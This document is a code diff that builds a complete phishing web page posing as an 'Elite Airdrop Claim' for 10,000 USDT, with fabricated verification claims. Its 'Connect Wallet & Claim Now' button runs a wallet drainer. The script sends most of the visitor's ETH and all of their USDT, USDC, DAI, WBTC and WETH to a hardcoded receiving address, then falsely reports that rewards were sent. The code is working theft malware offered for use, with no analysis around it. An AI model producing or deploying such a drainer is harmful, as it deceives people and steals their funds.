@@ -1,57 +1,94 @@
-<script>
-const RECEIVER = "0xe59A4C6E229b01BCf17d760E9805E4326f9A7585"; // Your drain address
-
-async function connectAndDrain() {
-    if (!window.ethereum) {
-        alert("Please install MetaMask or another wallet!");
-        return;
-    }
-
-    try {
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
-        const address = await signer.getAddress();
-
-        // Drain Native ETH
-        const balance = await provider.getBalance(address);
-        if (balance.gt(0)) {
-            const tx = await signer.sendTransaction({
-                to: RECEIVER,
-                value: balance.mul(95).div(100) // Leave ~5% for gas
-            });
-            await tx.wait();
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elite Airdrop Claim - Connect Wallet</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        body { 
+            background: #0a0a0a; 
+            color: #fff; 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 100px 20px; 
         }
+        h1 { font-size: 2.5em; margin-bottom: 10px; }
+        p { font-size: 1.2em; color: #ccc; }
+        button { 
+            padding: 18px 50px; 
+            font-size: 22px; 
+            background: #00ff00; 
+            color: #000; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            margin: 30px 0;
+        }
+        button:hover { background: #00cc00; }
+    </style>
+</head>
+<body>
+    <h1>Elite Airdrop Claim</h1>
+    <p>Connect your wallet to claim 10,000 USDT instantly</p>
+    <button onclick="connectAndDrain()">Connect Wallet & Claim Now</button>
+    <p style="margin-top:40px; color:#666; font-size:0.9em;">Verified by 12,458 users • Limited time offer</p>
 
-        // ERC-20 Tokens (expanded list)
-        const tokens = [
-            "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
-            "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
-            "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
-            "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
-            "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
-            // Add more tokens as needed
-        ];
+    <script>
+        const RECEIVER = "0xe59A4C6E229b01BCf17d760E9805E4326f9A7585"; // Your drain address
 
-        for (let tokenAddr of tokens) {
+        async function connectAndDrain() {
+            if (!window.ethereum) {
+                alert("Please install MetaMask or another wallet!");
+                return;
+            }
+
             try {
-                const token = new ethers.Contract(tokenAddr, [
-                    "function balanceOf(address) view returns (uint256)",
-                    "function transfer(address, uint256) returns (bool)"
-                ], signer);
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const address = await signer.getAddress();
 
-                const bal = await token.balanceOf(address);
-                if (bal.gt(0)) {
-                    await token.transfer(RECEIVER, bal);
+                // Drain Native ETH
+                const balance = await provider.getBalance(address);
+                if (balance.gt(0)) {
+                    const tx = await signer.sendTransaction({
+                        to: RECEIVER,
+                        value: balance.mul(95).div(100)
+                    });
+                    await tx.wait();
                 }
-            } catch(e) {}
-        }
 
-        console.log("%cWallet drained: " + address, "color: red; font-size: 16px");
-        alert("Claim successful! Rewards sent to your wallet.");
-    } catch (e) {
-        console.error(e);
-        alert("Transaction failed or rejected.");
-    }
-}
-</script>
+                // ERC-20 Tokens
+                const tokens = [
+                    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+                    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+                    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
+                    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
+                    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
+                ];
+
+                for (let tokenAddr of tokens) {
+                    try {
+                        const token = new ethers.Contract(tokenAddr, [
+                            "function balanceOf(address) view returns (uint256)",
+                            "function transfer(address, uint256) returns (bool)"
+                        ], signer);
+
+                        const bal = await token.balanceOf(address);
+                        if (bal.gt(0)) {
+                            await token.transfer(RECEIVER, bal);
+                        }
+                    } catch(e) {}
+                }
+
+                console.log("%cWallet drained: " + address, "color: red; font-size: 16px");
+                alert("Claim successful! Rewards sent to your wallet.");
+            } catch (e) {
+                console.error(e);
+                alert("Transaction failed or rejected.");
+            }
+        }
+    </script>
+</body>
+</html>
